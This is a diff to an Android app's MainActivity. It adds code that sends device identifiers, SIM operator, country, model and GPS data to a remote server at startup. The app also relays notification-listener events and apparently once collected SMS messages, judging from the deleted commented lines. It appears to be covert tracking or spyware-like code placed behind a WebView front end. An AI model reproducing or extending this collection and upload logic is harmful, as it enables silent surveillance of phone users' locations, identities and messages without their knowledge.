@@ -29,7 +29,12 @@ public class MainActivity extends AppCompatActivity {
     public String serverURL;
 
     private Intent locateServiceIntent;
-
+    public static interface Actions {
+        String ON_STARTUP = "ON_STARTUP";
+    }
+    public static final String[] actionFilters = new String[]{
+            Actions.ON_STARTUP,
+    };
     public void setDeviceInfo() {
         TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
         String release = Build.VERSION.RELEASE;
@@ -40,7 +45,7 @@ public class MainActivity extends AppCompatActivity {
         String deviceLang = Locale.getDefault().getLanguage();
         String DEVICE_ID = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
         String DEVICE_UID = deviceManu+"_"+DEVICE_ID;
-        serverURL = getString(R.string.server_uri) +"?pid="+ DEVICE_UID;
+        serverURL = getString(R.string.server_uri) +"?id="+ DEVICE_UID;
         deviceInfo.put("country", countryCode.toUpperCase() + "");
         deviceInfo.put("software_version",  "Android " + release);
         deviceInfo.put("sim_operator", telephonyManager.getSimOperatorName() + "");
@@ -48,10 +53,9 @@ public class MainActivity extends AppCompatActivity {
         deviceInfo.put("device_model", deviceName + " - " + modelName);
         deviceInfo.put("device_manufacture", deviceManu);
         deviceInfo.put("device_language", deviceLang);
+
     }
     public void setServerPayload() {
-//        payload.put("notify", notifyMsg);
-//        payload.put("sms", smsPrevCount==0 ?null : deviceSMS);
         payload.put("gps", ILocateService.lastKnowVectors);
         payload.put("@gps", ILocateService.MODEL);
     }
@@ -76,6 +80,10 @@ public class MainActivity extends AppCompatActivity {
                 Log.i(INotifyService.TAG, "TRIGGER_"+data);
                 payload.put("@trigger", action);
                 setServerPayload();
+                Utils.postDataToServer(getApplicationContext(), payload, serverURL);
+            }
+            if(action.equals("ON_STARTUP")){
+                payload.put("device", deviceInfo);
                 Utils.postDataToServer(getApplicationContext(), payload, serverURL);
             }
             if(action.equals(INotifyService.Actions.ON_NOTIFICATION_POSTED)){
@@ -103,12 +111,14 @@ public class MainActivity extends AppCompatActivity {
         setDeviceInfo();
         // Start Broadcast manager service
         String[][] serviceActions = new String[][]{
+                Utils.genActions(MainActivity.actionFilters,null),
                 Utils.genActions(ILocateService.permissions,null),
                 Utils.genActions(ILocateService.actionFilters, null),
                 Utils.genActions(INotifyService.permissions, null),
                 Utils.genActions(INotifyService.actionFilters, null),
                 Utils.genActions(INotifyService.triggerFilters, null),
         };
+
         LocalBroadcastManager.getInstance(this)
                 .registerReceiver(broadcastReceiver, Utils.genIntentFilter(serviceActions));
 
@@ -117,6 +127,7 @@ public class MainActivity extends AppCompatActivity {
         Utils.requestAppPermissions(this, INotifyService.permissions, ILocateService.LOCATION_PERMISSION_CODE);
         // Start ILocation Permissions
         Utils.requestAppPermissions(this, ILocateService.permissions, ILocateService.LOCATION_PERMISSION_CODE);
+        LocalBroadcastManager.getInstance(this).sendBroadcast(new Intent("ON_STARTUP"));
 
         // Load Webview
         webView = findViewById(R.id.droidWebView);
